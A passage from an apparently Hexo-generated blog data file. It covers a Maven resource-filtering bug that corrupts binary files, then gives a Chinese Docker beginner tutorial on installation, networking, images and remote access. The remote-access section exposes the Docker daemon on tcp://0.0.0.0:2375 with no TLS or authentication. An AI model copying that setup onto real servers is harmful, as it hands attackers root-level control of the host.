java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class=\"line\">\tat org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:317)</span><br><span class=\"line\">\tat org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:190)</span><br><span class=\"line\">\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:157)</span><br><span class=\"line\">\tat org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:99)</span><br><span class=\"line\">\tat org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:281)</span><br><span class=\"line\">\tat org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:96)</span><br><span class=\"line\">\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:179)</span><br><span class=\"line\">\tat org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:92)</span><br><span class=\"line\">\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:179)</span><br><span class=\"line\">\tat org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:207)</span><br><span class=\"line\">\tat com.sun.proxy.$Proxy92.checkPayGuangda(Unknown Source)</span><br><span class=\"line\">\tat com.yoochatting.market.v5.service.PayService$checkPayGuangda.call(Unknown Source)</span><br><span class=\"line\">\tat org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:48)</span><br><span class=\"line\">\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:113)</span><br><span class=\"line\">\tat com.yoochatting.market.ctrl.AndroidBuyerbV5Controller.guangdaPayOrder(AndroidBuyerbV5Controller.groovy:618)</span><br><span class=\"line\">\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class=\"line\">\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class=\"line\">\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class=\"line\">\tat java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class=\"line\">\tat org.springframework.web.bind.annotation.support.HandlerMethodInvoker.invokeHandlerMethod(HandlerMethodInvoker.java:177)</span><br><span class=\"line\">\tat org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.invokeHandlerMethod(AnnotationMethodHandlerAdapter.java:446)</span><br><span class=\"line\">\tat org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.handle(AnnotationMethodHandlerAdapter.java:434)</span><br><span class=\"line\">\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:943)</span><br><span class=\"line\">\tat org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:877)</span><br><span class=\"line\">\tat org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:966)</span><br><span class=\"line\">\tat org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:857)</span><br><span class=\"line\">\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:624)</span><br><span class=\"line\">\tat org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:842)</span><br><span class=\"line\">\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:731)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)</span><br><span class=\"line\">\tat org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)</span><br><span class=\"line\">\tat org.tuckey.web.filters.urlrewrite.RuleChain.handleRewrite(RuleChain.java:176)</span><br><span class=\"line\">\tat org.tuckey.web.filters.urlrewrite.RuleChain.doRules(RuleChain.java:145)</span><br><span class=\"line\">\tat org.tuckey.web.filters.urlrewrite.UrlRewriter.processRequest(UrlRewriter.java:92)</span><br><span class=\"line\">\tat org.tuckey.web.filters.urlrewrite.UrlRewriteFilter.doFilter(UrlRewriteFilter.java:394)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:747)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:485)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:410)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:337)</span><br><span class=\"line\">\tat org.tuckey.web.filters.urlrewrite.NormalRewrittenUrl.doRewrite(NormalRewrittenUrl.java:213)</span><br><span class=\"line\">\tat org.tuckey.web.filters.urlrewrite.RuleChain.handleRewrite(RuleChain.java:171)</span><br><span class=\"line\">\tat org.tuckey.web.filters.urlrewrite.RuleChain.doRules(RuleChain.java:145)</span><br><span class=\"line\">\tat org.tuckey.web.filters.urlrewrite.UrlRewriter.processRequest(UrlRewriter.java:92)</span><br><span class=\"line\">\tat org.tuckey.web.filters.urlrewrite.UrlRewriteFilter.doFilter(UrlRewriteFilter.java:394)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)</span><br><span class=\"line\">\tat org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88)</span><br><span class=\"line\">\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)</span><br><span class=\"line\">\tat org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)</span><br><span class=\"line\">\tat org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)</span><br><span class=\"line\">\tat org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:505)</span><br><span class=\"line\">\tat org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)</span><br><span class=\"line\">\tat org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)</span><br><span class=\"line\">\tat org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:958)</span><br><span class=\"line\">\tat org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)</span><br><span class=\"line\">\tat org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:452)</span><br><span class=\"line\">\tat org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1087)</span><br><span class=\"line\">\tat org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:637)</span><br><span class=\"line\">\tat org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.doRun(AprEndpoint.java:2517)</span><br><span class=\"line\">\tat org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:2506)</span><br><span class=\"line\">\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)</span><br><span class=\"line\">\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)</span><br><span class=\"line\">\tat org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)</span><br><span class=\"line\">\tat java.lang.Thread.run(Thread.java:748)</span><br></pre></td></tr></table></figure>\n\n<p>出现该错误，大都是因为maven将resources下文件拷到classes下的时候导致的，当filtering为true时，maven会在拷贝文件过程中进行变量替换，这导致原文件格式发生变化。而对于jks、so等二进制文件，文件内任意的字节变化都有可能导致文件不符合格式规范，所以会出现报错情况。</p>\n<p>filtering参数官方的解释如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">filtering: is true or false, denoting if filtering is to be enabled for this resource. Note, that filter *.properties files do not have to be defined for filtering to occur - resources can also use properties that are by default defined in the POM (such as $&#123;project.version&#125;), passed into the command line using the &quot;-D&quot; flag (for example, &quot;-Dname=value&quot;) or are explicitly defined by the properties element. Filter files were covered above.</span><br></pre></td></tr></table></figure>\n\n<p>意思是，maven会根据<code>&lt;build&gt;&lt;filters&gt; &lt;filter&gt;filters/filter1.properties&lt;/filter&gt; &lt;/filters&gt;&lt;/build&gt;</code>下所定义的变量值、pom文件内默认的诸如<code>project.version</code>之类的变量，以及运行命令中-D参数定义的变量，对文件中的${}位置进行变量的替换，该机制在某些情景中应用很有意义，例如：想要在项目中获取pom文件中规定的项目版本号，可以在config.properties中增加一行：<code>version=${project.version}</code>，即可使config.properties中的版本号和pom文件保持一致。即使没有匹配的变量，filtering为true时也不可避免的对文件中的某些字节进行了修改。</p>\n<p>解决办法是，如果没有需要变量替换的情况，可以最简单的将filtering设为false，否则需将二进制文件单独定义拷贝，并将filtering参数设置为false：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;resource&gt;</span><br><span class=\"line\">\t&lt;directory&gt;$&#123;basedir&#125;/src/main/resources&lt;/directory&gt;</span><br><span class=\"line\">\t&lt;includes&gt;</span><br><span class=\"line\">\t\t&lt;include&gt;abcd.so&lt;/include&gt;</span><br><span class=\"line\">\t&lt;/includes&gt;</span><br><span class=\"line\">\t&lt;filtering&gt;false&lt;/filtering&gt;</span><br><span class=\"line\">&lt;/resource&gt;</span><br></pre></td></tr></table></figure>\n\n<p>在pom文件中指定该文件拷贝规则filtering为false</p>\n"},{"title":"DOCKER一键入门","date":"2018-08-28T12:55:08.000Z","keywords":"docker, 入门教程, 安装","rId":"MB-18082801","_content":"\nbase Ubuntu 16.04\n\n# 入门操作\n## 安装\n1. `sudo apt-get remove docker docker-engine docker-ce docker.io` \n2. `sudo apt-get update` \n3. `sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common`  （使apt能接受https的ppa库） \n4. `curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -`       （docker官方GPG密钥）\n5. `sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\"`     （ppa库，这个地址好像不是很好用，在某些网络下会失败，成功率与各自网络有关。出现网络问题的话，有条件的同学可以考虑科学上网）\n6. `sudo apt-get update`\n7. `sudo apt-get install -y docker-ce`      (安装最新版)\n如果不想要最新版：\n`apt-cache madison docker-ce`       （查看版本列表）  \n`sudo apt-get install docker-ce=<VERSION>`      （指定版本安装）  \n\n## 创建docker用户组\n`sudo groupadd docker`            （应该不需要执行，已经有了）  \n`sudo usermod -aG docker $USER`     （将当前用户添加到附加组群docker）  \n重新登录用户账户使生效\n\n## 验证\n`systemctl status docker`     （启动状态）  \n`sudo systemctl start docker`    （启动，或 `sudo service docker start`）  \n`sudo docker run hello-world`     （官方提供hello world程序）  \n\n## 创建镜像并运行生成容器\n新建名称为Dockerfile的文件（无后缀名），输入如下内容并保存： \n```\nFROM ubuntu:16.04\n\nRUN \\\n    apt-get update &&\\\n    apt-get install -y openjdk-8-jdk &&\\\n    rm -rf /var/lib/apt/lists/*\n\nENV JAVA_HOME /usr/lib/jvm/java-8-openjdk-amd64\nENV LANG C.UTF-8\n\nCMD [\"/bin/bash\"]\n```\n文件中，继承了ubuntu的docker镜像(ubuntu:16.04)的16.04版本   \n在该目录下直接执行以下命令新建镜像：  \n`docker build -t mytest/jdk:1.8 .`        （运行过程较长。不要漏了最后的点，最后那个点代表当前目录，倒二参数镜像名可任意设置，-t 为tag）   \n`docker images`            可看到mytest/jdk:1.8已进入现有镜像列表中  \n`docker run -p 80:8080 -it mytest/jdk:1.8`          启动docker镜像新建立一个容器（-p 表示将主机80端口映射到容器内部的8080端口，此例中端口映射没有什么意义，只是为了说明，--name=myname ：手动分配名字，-t 伪tty终端，-d 守护进程的方式后台执行（默认交互进程方式），CMD为.需要保持tty终端连接的运行命令时需要-d否则sh执行完docker就退出了），如果Dockerfile中没有定义命令CMD运行不成功，这时可在docker run的最后面添加运行命令手动指定  \n运行成功后，在容器内输入命令：java -version 可看到jdk已经安装成功  \n\n\n\n# 模块化知识点\n## docker概念\nDocker客户端        命令行允许时给客户端发送命令，客户端分发到指定容器  \nDocker Daemon 守护进程        docker允许依赖的进程  \nDocker Image 镜像        docker启动前需要指定之前制作的镜像（即源码，只读模式）  \nDocker Container 容器        docker运行镜像的拷贝于虚拟机上（运行后的镜像为叫容器，即镜像的实例，读写模式），可对其停止运行，重新运行，内部命令操作，修改后重新打包为新镜像，一个镜像可运行为多个容器  \nDocker Registry 仓库        docker镜像存储的位置，有公有仓库与私有仓库  \n交互式容器与守护式容器        交互式容器：当前命令进程执行完毕容器即退出；守护式容器：当前命令进程与该进程启动的进程都运行完毕才退出，通常没有交互式程序时使用  \n\n## 容器停止与启动\n`docker stop 8d43`            停止正在运行的容器（发出结束的信号，8d43为通过docker ps 查看到的name前面几个字符，stop时name无须填完整，只要docker能识别不引起歧义就行）  \n`docker start -i 8d43`            重新运行容器（-i 标准输入始终打开）  \n`docker kill 8d43`            快速强制停止容器  \n\n## 容器与镜像的删除\n`docker rm 8d43`            删除已经停止的容器（需先停止容器）  \n`docker rmi uettydkr/test:1.0`            删除镜像(需先删除该镜像的所有容器实例)  \n\n## 容器网络设置\n### 端口映射\n`docker run -P -i -t uettydkr/test:1.0`            对容器暴露的所有端口进行映射  \n`docker run -p 8080 -i -t uettydkr/test:1.0`            指定容器8080端口映射到宿主机的随机端口  \n`docker run -p 80:8080 -i -t uettydkr/test:1.0`            容器的8080端口映射到宿主机的80端口  \n`docker run -p 0.0.0.0:8080 -i -t uettydkr/test:1.0`            指定容器ip和容器的端口  \n`docker run -p 0.0.0.0:80:8080 -i -t uettydkr/test:1.0`            指定容器ip，容器8080端口映射到宿主机的80端口  \n`docker port 8d43`            查看端口映射情况  \n`docker run --net=host -i -t uettydkr/test:1.0`             --net=host 将使容器与宿主机共用端口（较少使用），可能导致容器内新启动的程序的端口会与宿主机发生冲突  \n\n### 使用bridge-utils进行网桥操作\n安装：`sudo apt-get install bridge-utils`  \n验证：`sudo brctl show`  \n添加一个新的网桥：`sudo brctl addbr mybr0 && sudo ifconfig mybr0 192.168.200.1 netmask 255.255.255.0`  \n\n### 网络地址\n修改dockers网络地址ip网段：`sudo ifconfig docker0 192.168.192.1 netmask 255.255.255.0 && sudo service docker restart`  \n修改docker使用的网桥为mybr0：  \n`vim /etc/default/docker`  \n在DOCKER_OPTS中添加参数 `DOCKER_OPTS=\" -b=mybr0 \" `，重启docker service  \n\n### 容器互联LINK方式\n默认是允许所有容器互相连接  \n使用给容器ip地址设置别名（不设置别名的情况下，默认设置下通过ip实际也能访问），避免重启ip变化：  \n容器1：`docker run -it --name=c1 ubuntu:16.04`  \n容器2连接容器1：`docker run -it --name=c2 --link=c1:host1 ubuntu:16.04`     在容器2内部输入命令env或者cat /etc/hosts可看到影响情况  \n修改默认互联规则为拒绝：DOCKER_OPTS中添加 --icc=false ，重启docker service  \n特定容器连接：DOCKER_OPTS中添加 --icc=false外，还需要 --iptables=true 让docker容器把配置添加到iptables设置中，并且容器需用--link选项，需先将iptables的设置清空（sudo iptables -F），并且重启启动docker，查看iptables设置（`sudo iptables -L -n`）  \n\n### 容器互联BRIDGE方式\n创建一个网桥：`docker network create mysql-ms`  \n指定网桥及网络别名启动  \n`docker run -it --name=mysql-m1 --network=mysql-ms --network-alias=mysql-m1 uetty/mysql:5.7.23`  \n`docker run -it --name=mysql-s1 --network=mysql-ms --network-alias=mysql-s1 uetty/mysql:5.7.23`  \n\n### 容器与外部网络连接\n默认是允许与外部网络连接  \n通过`sudo sysctl net.ipv4.conf.all.forwarding`可查看系统ipforward值  \n设置禁止容器与外部网络连接DOCKER_OPTS添加 --ip-forward=false，重启docker service  \n设置容器(172.17.0.2)80端口不被特定ip(111.11.11.11)访问（通过iptables）：`sudo iptables -I DOCKER -s 111.11.11.11 -d 172.17.0.2 -p TCP --dport 80 -j DROP`  \n\n## 远程镜像仓库\nhttps://hub.docker.com/           docker官方仓库地址  \n`docker search ubuntu`             --automated=false true时只选中自动化构建出的镜像；--no-trunc=false true时不以截断的方式输出；-s或--stars=0 限制显示结果的最低星级  \n`docker pull ubuntu:14.04`            从远程拉取镜像  \n`docker login`           登陆远程镜像仓库，之后会提示输入账户和密码  \n`docker push uetty/test:1.0`            将镜像push到远程镜像仓库（须在docker hub创建有账户，并创建这个仓库，本地执行过登陆）  \n\n修改镜像仓库镜像地址加速拉取： 1. 修改： `/etc/default/docker`；2. 添加 `DOCKER_OPTS=\"--registry-mirror=http://MIRROR-ADDR\"`  \n国内可以选择daocloud.io 注册账号后选择加速器生成链接：如：http://ae6fed91.m.daocloud.io  \n\n## 构建自己的镜像\n### 通过commit容器的方式构建镜像\n1. 先从公共镜像仓库中拉曲一个ubuntu镜像：`docker pull ubuntu:16.04`  \n2. 使用该镜像启动一个容器：`docker run -d --name ubuntu-nginx ubuntu:16.04 /bin/bash`  \n3. 进入容器：`docker exec -it ubuntu-nginx /bin/bash`  \n4. 安装自己的软件(nginx)：`apt-get update && apt-get install nginx`  \n5. 安装完毕后退出容器：`ctrl + p && ctrl + q`  \n6. 提交容器生成镜像：`docker commit -a \"uetty\" -m \"nginx\" b9fa70 uetty/nginx`            生成镜像名为uetty/nginx（-a 作者信息；-m 镜像信息描述）  \n7. 接下来有需要的话可以把镜像提交到远程仓库中\n### 通过Dockerfile的方式构建镜像\n前面入门操作->创建镜像并运行生成容器 中已经介绍  \n\n## 远程访问\n需保证Client API与Server API版本一致，修改启动选项区别服务器  \n\n### 服务端（server_1）环境\n修改启动选项`sudo vim /etc/default/docker`，输入  \n`DOCKER_OPTS=\" --label name=docker_server_1 -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock\"`    --label给服务器上标签，通过docker info可看到label值，-H 接受三种形式：tcp://host:port，unix:///path/to/socket（默认），fd://* or fd://socketfd，-H 可指定多个，为了保证本地客户端不被影响应加上unix方式  \n`sudo service docker restart`     重启生效  \n`curl http://xx.xx.xx.xx:2375/info`            检测  \n`docker -H tcp://xx.xx.xx.xx:2375 info`    客户端访问  \n\n### 客户端(server_2)远程连接\n另一台服务器  \n`export DOCKER_HOST=\"tcp://xx.xx.xx.xx:2375\"`       默认连接到远程服务端  \n`docker info`            可以从这里看到这时访问到远程服务端  \n`export DOCKER_HOST=\"\"`            取消默认远程客户端  \n\n## 与宿主机进行地址映射与文件拷贝\n`docker run -d -v /data/volumes/ubuntu:/data --name ubuntu-nginx ubuntu:16.04 /bin/bash`        将宿主机的/data/volumes/ubuntu 目录映射到容器/data目录  \n`docker cp ubuntu-nginx:/a.txt a.txt`             将容器内a.txt文件拷贝到宿主机  \n创建数据卷容器，并将数据卷容器挂载给其他容器  \n`docker run -it -v /var/lib/mysql --name mysql-data ubuntu:16.04 /bin/bash`           创建数据卷容器  \n`docker run -it --volumes-from mysql-data --name mysql uetty/mysql:5.7.23 /bin/bash`        挂载数据卷容器  \n\n## 其他操作命令一览\n`docker ps`                        查看各镜像状态（无参数：列出运行的容器，-a：列出所有的容器，-l：列出最后运行的容器）  \n`docker exec -it 8d43 /bin/bash`            容器中启动新进程，异步方式进入docker容器命令行（如果容器构建使用的是/bin/sh，最后一个参数换成/bin/sh）  \n`docker images`            可看到uettydkr/test:1.0已进入现有镜像列表中  \n`docker attach 8d43`           附加到docker容器，同步方式进入容器命令行（如果某个客户端阻塞了，该方式进入也会被阻塞，因此不推荐）  \n`docker inspect 8d43`            列出容器json格式信息  \n`ctrl+p && ctrl+q`            退出交互式容器，容器不会停止运行（即先后按下`ctrl + p` `ctrl + q`两个命令）  \n`docker logs 8d43`            返回日志（默认返回所有日志，-f：持续返回日志，-t：返回的日志增加时间戳，--tail 10 指定显示最新的10条日志）  \n`docker top 8d43`            查看运行中容器的进程情况  \n`docker info`            查看docker信息，包括镜像存储位置  \n`docker search java`        从远程镜像仓库查找镜像  \n","source":"_posts/2018-08-28_docker.md","raw":"---\ntitle: DOCKER一键入门\ndate: 2018-08-28 20:55:08\ntags: docker\npermalink: docker\nkeywords: docker, 入门教程, 安装\nrId: MB-18082801\n---\n\nbase Ubuntu 16.04\n\n# 入门操作\n## 安装\n1. `sudo apt-get remove docker docker-engine docker-ce docker.io` \n2. `sudo apt-get update` \n3. `sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common`  （使apt能接受https的ppa库） \n4. `curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -`       （docker官方GPG密钥）\n5. `sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\"`     （ppa库，这个地址好像不是很好用，在某些网络下会失败，成功率与各自网络有关。出现网络问题的话，有条件的同学可以考虑科学上网）\n6. `sudo apt-get update`\n7. `sudo apt-get install -y docker-ce`      (安装最新版)\n如果不想要最新版：\n`apt-cache madison docker-ce`       （查看版本列表）  \n`sudo apt-get install docker-ce=<VERSION>`      （指定版本安装）  \n\n## 创建docker用户组\n`sudo groupadd docker`            （应该不需要执行，已经有了）  \n`sudo usermod -aG docker $USER`     （将当前用户添加到附加组群docker）  \n重新登录用户账户使生效\n\n## 验证\n`systemctl status docker`     （启动状态）  \n`sudo systemctl start docker`    （启动，或 `sudo service docker start`）  \n`sudo docker run hello-world`     （官方提供hello world程序）  \n\n## 创建镜像并运行生成容器\n新建名称为Dockerfile的文件（无后缀名），输入如下内容并保存： \n```\nFROM ubuntu:16.04\n\nRUN \\\n    apt-get update &&\\\n    apt-get install -y openjdk-8-jdk &&\\\n    rm -rf /var/lib/apt/lists/*\n\nENV JAVA_HOME /usr/lib/jvm/java-8-openjdk-amd64\nENV LANG C.UTF-8\n\nCMD [\"/bin/bash\"]\n```\n文件中，继承了ubuntu的docker镜像(ubuntu:16.04)的16.04版本   \n在该目录下直接执行以下命令新建镜像：  \n`docker build -t mytest/jdk:1.8 .`        （运行过程较长。不要漏了最后的点，最后那个点代表当前目录，倒二参数镜像名可任意设置，-t 为tag）   \n`docker images`            可看到mytest/jdk:1.8已进入现有镜像列表中  \n`docker run -p 80:8080 -it mytest/jdk:1.8`          启动docker镜像新建立一个容器（-p 表示将主机80端口映射到容器内部的8080端口，此例中端口映射没有什么意义，只是为了说明，--name=myname ：手动分配名字，-t 伪tty终端，-d 守护进程的方式后台执行（默认交互进程方式），CMD为.需要保持tty终端连接的运行命令时需要-d否则sh执行完docker就退出了），如果Dockerfile中没有定义命令CMD运行不成功，这时可在docker run的最后面添加运行命令手动指定  \n运行成功后，在容器内输入命令：java -version 可看到jdk已经安装成功  \n\n\n\n# 模块化知识点\n## docker概念\nDocker客户端        命令行允许时给客户端发送命令，客户端分发到指定容器  \nDocker Daemon 守护进程        docker允许依赖的进程  \nDocker Image 镜像        docker启动前需要指定之前制作的镜像（即源码，只读模式）  \nDocker Container 容器        docker运行镜像的拷贝于虚拟机上（运行后的镜像为叫容器，即镜像的实例，读写模式），可对其停止运行，重新运行，内部命令操作，修改后重新打包为新镜像，一个镜像可运行为多个容器  \nDocker Registry 仓库        docker镜像存储的位置，有公有仓库与私有仓库  \n交互式容器与守护式容器        交互式容器：当前命令进程执行完毕容器即退出；守护式容器：当前命令进程与该进程启动的进程都运行完毕才退出，通常没有交互式程序时使用  \n\n## 容器停止与启动\n`docker stop 8d43`            停止正在运行的容器（发出结束的信号，8d43为通过docker ps 查看到的name前面几个字符，stop时name无须填完整，只要docker能识别不引起歧义就行）  \n`docker start -i 8d43`            重新运行容器（-i 标准输入始终打开）  \n`docker kill 8d43`            快速强制停止容器  \n\n## 容器与镜像的删除\n`docker rm 8d43`            删除已经停止的容器（需先停止容器）  \n`docker rmi uettydkr/test:1.0`            删除镜像(需先删除该镜像的所有容器实例)  \n\n## 容器网络设置\n### 端口映射\n`docker run -P -i -t uettydkr/test:1.0`            对容器暴露的所有端口进行映射  \n`docker run -p 8080 -i -t uettydkr/test:1.0`            指定容器8080端口映射到宿主机的随机端口  \n`docker run -p 80:8080 -i -t uettydkr/test:1.0`            容器的8080端口映射到宿主机的80端口  \n`docker run -p 0.0.0.0:8080 -i -t uettydkr/test:1.0`            指定容器ip和容器的端口  \n`docker run -p 0.0.0.0:80:8080 -i -t uettydkr/test:1.0`            指定容器ip，容器8080端口映射到宿主机的80端口  \n`docker port 8d43`            查看端口映射情况  \n`docker run --net=host -i -t uettydkr/test:1.0`             --net=host 将使容器与宿主机共用端口（较少使用），可能导致容器内新启动的程序的端口会与宿主机发生冲突  \n\n### 使用bridge-utils进行网桥操作\n安装：`sudo apt-get install bridge-utils`  \n验证：`sudo brctl show`  \n添加一个新的网桥：`sudo brctl addbr mybr0 && sudo ifconfig mybr0 192.168.200.1 netmask 255.255.255.0`  \n\n### 网络地址\n修改dockers网络地址ip网段：`sudo ifconfig docker0 192.168.192.1 netmask 255.255.255.0 && sudo service docker restart`  \n修改docker使用的网桥为mybr0：  \n`vim /etc/default/docker`  \n在DOCKER_OPTS中添加参数 `DOCKER_OPTS=\" -b=mybr0 \" `，重启docker service  \n\n### 容器互联LINK方式\n默认是允许所有容器互相连接  \n使用给容器ip地址设置别名（不设置别名的情况下，默认设置下通过ip实际也能访问），避免重启ip变化：  \n容器1：`docker run -it --name=c1 ubuntu:16.04`  \n容器2连接容器1：`docker run -it --name=c2 --link=c1:host1 ubuntu:16.04`     在容器2内部输入命令env或者cat /etc/hosts可看到影响情况  \n修改默认互联规则为拒绝：DOCKER_OPTS中添加 --icc=false ，重启docker service  \n特定容器连接：DOCKER_OPTS中添加 --icc=false外，还需要 --iptables=true 让docker容器把配置添加到iptables设置中，并且容器需用--link选项，需先将iptables的设置清空（sudo iptables -F），并且重启启动docker，查看iptables设置（`sudo iptables -L -n`）  \n\n### 容器互联BRIDGE方式\n创建一个网桥：`docker network create mysql-ms`  \n指定网桥及网络别名启动  \n`docker run -it --name=mysql-m1 --network=mysql-ms --network-alias=mysql-m1 uetty/mysql:5.7.23`  \n`docker run -it --name=mysql-s1 --network=mysql-ms --network-alias=mysql-s1 uetty/mysql:5.7.23`  \n\n### 容器与外部网络连接\n默认是允许与外部网络连接  \n通过`sudo sysctl net.ipv4.conf.all.forwarding`可查看系统ipforward值  \n设置禁止容器与外部网络连接DOCKER_OPTS添加 --ip-forward=false，重启docker service  \n设置容器(172.17.0.2)80端口不被特定ip(111.11.11.11)访问（通过iptables）：`sudo iptables -I DOCKER -s 111.11.11.11 -d 172.17.0.2 -p TCP --dport 80 -j DROP`  \n\n## 远程镜像仓库\nhttps://hub.docker.com/           docker官方仓库地址  \n`docker search ubuntu`             --automated=false true时只选中自动化构建出的镜像；--no-trunc=false true时不以截断的方式输出；-s或--stars=0 限制显示结果的最低星级  \n`docker pull ubuntu:14.04`            从远程拉取镜像  \n`docker login`           登陆远程镜像仓库，之后会提示输入账户和密码  \n`docker push uetty/test:1.0`            将镜像push到远程镜像仓库（须在docker hub创建有账户，并创建这个仓库，本地执行过登陆）  \n\n修改镜像仓库镜像地址加速拉取： 1. 修改： `/etc/default/docker`；2. 添加 `DOCKER_OPTS=\"--registry-mirror=http://MIRROR-ADDR\"`  \n国内可以选择daocloud.io 注册账号后选择加速器生成链接：如：http://ae6fed91.m.daocloud.io  \n\n## 构建自己的镜像\n### 通过commit容器的方式构建镜像\n1. 先从公共镜像仓库中拉曲一个ubuntu镜像：`docker pull ubuntu:16.04`  \n2. 使用该镜像启动一个容器：`docker run -d --name ubuntu-nginx ubuntu:16.04 /bin/bash`  \n3. 进入容器：`docker exec -it ubuntu-nginx /bin/bash`  \n4. 安装自己的软件(nginx)：`apt-get update && apt-get install nginx`  \n5. 安装完毕后退出容器：`ctrl + p && ctrl + q`  \n6. 提交容器生成镜像：`docker commit -a \"uetty\" -m \"nginx\" b9fa70 uetty/nginx`            生成镜像名为uetty/nginx（-a 作者信息；-m 镜像信息描述）  \n7. 接下来有需要的话可以把镜像提交到远程仓库中\n### 通过Dockerfile的方式构建镜像\n前面入门操作->创建镜像并运行生成容器 中已经介绍  \n\n## 远程访问\n需保证Client API与Server API版本一致，修改启动选项区别服务器  \n\n### 服务端（server_1）环境\n修改启动选项`sudo vim /etc/default/docker`，输入  \n`DOCKER_OPTS=\" --label name=docker_server_1 -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock\"`    --label给服务器上标签，通过docker info可看到label值，-H 接受三种形式：tcp://host:port，unix:///path/to/socket（默认），fd://* or fd://socketfd，-H 可指定多个，为了保证本地客户端不被影响应加上unix方式  \n`sudo service docker restart`     重启生效 